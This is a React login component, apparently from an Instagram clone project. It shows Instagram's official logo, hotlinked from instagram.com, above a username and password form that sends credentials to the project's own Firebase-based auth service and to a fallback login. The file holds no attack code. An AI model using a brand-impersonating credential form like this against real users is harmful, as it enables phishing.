import React, { useState } from 'react';
import authService from '../services/authService';
import './Login.css';

const Login = ({ onLogin }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleEmailLogin = async (e) => {
    e.preventDefault();
    if (!username || !password) {
      setError('Please enter both username and password');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      // Try Firebase Auth first
      let result = await authService.loginWithCredentials(username, password);
      
      // If Firebase Auth fails, try fallback login
      if (!result.success) {
        result = authService.loginFallback(username, password);
      }

      if (result.success) {
        onLogin(result.user);
      } else {
        setError(result.error || 'Invalid username or password. Please try again.');
      }
    } catch (error) {
      console.error('Login error:', error);
      setError('Login failed. Please try again.');
    }

    setIsLoading(false);
  };



  return (
    <div className="login-container">
      <div className="login-card">
        <div className="instagram-logo">
          <img 
            src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" 
            alt="Instagram" 
            className="logo-image"
          />
        </div>

        <form onSubmit={handleEmailLogin} className="login-form">
                  <div className="form-group">
          <input
            type="text"
            className="form-input"
            placeholder="Username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            disabled={isLoading}
          />
        </div>
          <div className="form-group">
            <input
              type="password"
              className="form-input"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={isLoading}
            />
          </div>
          {error && <div className="error-message">{error}</div>}
          <button
            type="submit"
            className="login-button"
            disabled={isLoading}
          >
            {isLoading ? 'Logging in...' : 'Log In'}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Login;
